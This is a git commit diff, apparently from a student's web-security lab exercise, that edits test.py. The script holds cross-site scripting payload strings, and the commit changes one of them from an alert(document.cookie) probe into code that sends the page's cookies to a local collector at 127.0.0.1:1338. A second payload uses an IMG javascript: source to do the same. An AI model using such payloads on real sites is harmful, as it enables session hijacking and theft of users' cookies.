3a5dea5b63883cb9c8bce14d5fac3d0d3ec205b4
Ed Shao <ss5902@columbia.edu>
2019-11-10 18:04:20 -0500

    commit m

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import re
 
-comment = '<script>var pos = document.URL.indexof("name=" + 5; document.write(document.URL.substring(pos,document.URL.length));</script>&name=<script>alert(document.cookie)</script>'
+comment = '<script>var pos = document.URL.indexof("name=" + 5; document.write(document.URL.substring(pos,document.URL.length));</script>&name=<script>window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie)</script>'
 comment = '<IMG SRC="javascript:window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie);">'
 comment = ''
 print(comment)
